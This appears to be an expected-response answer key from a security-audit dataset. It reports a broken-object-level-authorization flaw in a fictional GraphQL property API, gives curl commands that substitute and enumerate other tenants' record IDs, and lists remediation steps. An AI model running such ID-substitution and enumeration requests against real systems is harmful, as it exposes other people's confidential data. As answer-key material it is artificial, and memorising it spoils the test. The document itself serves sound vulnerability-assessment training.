# Expected Response

## System
- Domain: Real Estate / PropTech
- System: EstateFlow Property API
- Example ID: GQL-0067

## Priority Findings

### Finding 1: Property Record BOLA — ID in Path Without Ownership Check (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA

**Summary:**
Per §5.0 (Pattern 1.1 — ID in path without ownership check): "`getResource` resolver accepts `resourceId` from the query without verifying ownership. An attacker with a valid `tenant-43da` token can substitute any `resourceId` value to retrieve objects belonging to `tenant-efd6`." Property records in a PropTech platform contain sensitive real estate data including valuations, ownership documents, and private sale terms.

**Evidence from HAR:**
- Request: `POST https://api.estateflow-property.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-43da`
- Query: `getResource(id: "R-2067") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-efd6"`, `ownerId: "other-user-43daefd6"`, `sensitiveField: "CONFIDENTIAL-43daefd6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-43daefd6`

**Root Cause (§4.0 RISK-GQL-067):** `getResource` resolver fetches by `resourceId` only; no tenantId match.

## Steps to Reproduce

### Step 1 — ID substitution to access victim property (HAR)
```bash
curl -s -X POST https://api.estateflow-property.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-43da" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2067\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-43daefd6` from `tenant-efd6`. **Secure:** FORBIDDEN.

### Step 2 — Sequential ID enumeration across property records
```bash
for id in R-2067 R-2068 R-2069; do
  curl -s -X POST https://api.estateflow-property.example.com/graphql \
    -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
    -H "Content-Type: application/json" -H "x-tenant-id: tenant-43da" \
    -d "{\"query\": \"query { getResource(id: \\\"$id\\\") { resourceId tenantId data { sensitiveField } } }\"}"
done
```

## Remediation
1. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Redis cache key: `resource:{tenantId}:{resourceId}`.
3. Return HTTP 404 (not 403) for non-owned resources to avoid confirming existence.
